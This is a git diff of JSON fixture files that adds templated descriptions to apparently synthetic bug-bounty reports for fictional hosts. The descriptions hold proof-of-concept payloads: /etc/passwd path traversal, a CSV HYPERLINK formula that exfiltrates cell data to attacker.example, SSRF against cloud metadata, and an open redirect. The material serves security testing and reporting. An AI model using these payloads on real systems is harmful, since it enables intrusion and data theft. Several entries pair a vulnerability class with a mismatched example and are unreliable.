+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.nebelstein-cloud.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14673,7 +14782,8 @@
           "offset": "1d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.nebelstein-cloud.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14814,7 +14924,8 @@
           "offset": "8d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14944,7 +15055,8 @@
           "offset": "5d 4h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.nebelstein-cloud.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15039,7 +15151,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15154,7 +15267,8 @@
           "offset": "1d 21h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15278,7 +15392,8 @@
           "offset": "1d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.nebelstein-cloud.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15430,7 +15545,8 @@
           "offset": "9d 15h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15575,7 +15691,8 @@
           "offset": "4d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15685,7 +15802,8 @@
           "offset": "1d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15829,7 +15947,8 @@
           "offset": "3d 2h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.nebelstein-cloud.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15939,7 +16058,8 @@
           "offset": "2d 19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16018,7 +16138,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16109,7 +16230,8 @@
           "offset": "2d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.nebelstein-cloud.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16241,7 +16363,8 @@
           "offset": "3d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16368,7 +16491,8 @@
           "offset": "3d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.nebelstein-cloud.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16491,7 +16615,8 @@
           "offset": "10d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16595,7 +16720,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16711,7 +16837,8 @@
           "offset": "1d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.nebelstein-cloud.foo/import`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16847,7 +16974,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16966,7 +17094,8 @@
           "offset": "1d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17125,7 +17254,8 @@
           "offset": "6d 8h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17273,7 +17403,8 @@
           "offset": "7d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17433,7 +17564,8 @@
           "offset": "3d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17589,7 +17721,8 @@
           "offset": "7d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.nebelstein-cloud.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17753,7 +17886,8 @@
           "offset": "2d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.nebelstein-cloud.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/rabenbrunn_it_reports.json b/fixtures/reports/rabenbrunn_it_reports.json
index f2b1999..5ec0518 100644
--- a/fixtures/reports/rabenbrunn_it_reports.json
+++ b/fixtures/reports/rabenbrunn_it_reports.json
@@ -70,7 +70,8 @@
           "offset": "5d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts a returnUrl query parameter that is not constrained to same-origin paths. After successful authentication, the application performs a 302 redirect to the supplied absolute URL, enabling open redirect to arbitrary attacker-controlled domains. This can be chained into convincing phishing flows (post-auth redirect) and, depending on downstream integrations, may also leak tokens or codes in certain OAuth/OIDC deployments where intermediates rely on the browser location or Referer. The absence of an allowlist, scheme/host checks, and path-only validation makes the issue trivial to exploit and suitable for large-scale redirection campaigns.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.rabenbrunn-it.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open the login page with an external absolute URL in the returnUrl parameter (e.g., https://portal.rabenbrunn-it.foo/login?returnUrl=https://evil.foo/path?utm=test).\n- Authenticate using any valid account and complete any MFA challenges as usual.\n- Upon successful authentication, observe the 302 Location header pointing to the external evil.foo domain and the browser navigation to that site.\n- Optionally test javascript: and protocol-relative values (which should be rejected) to verify current filtering behavior and identify additional bypass vectors.\n- Repeat with subdomain lookalikes (https://portal.rabenbrunn-it.foo.evil.foo) to confirm that naive prefix checks are not in place.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -227,7 +228,8 @@
           "offset": "8d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -371,7 +373,8 @@
           "offset": "4d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -494,7 +497,8 @@
           "offset": "7d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -594,7 +598,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
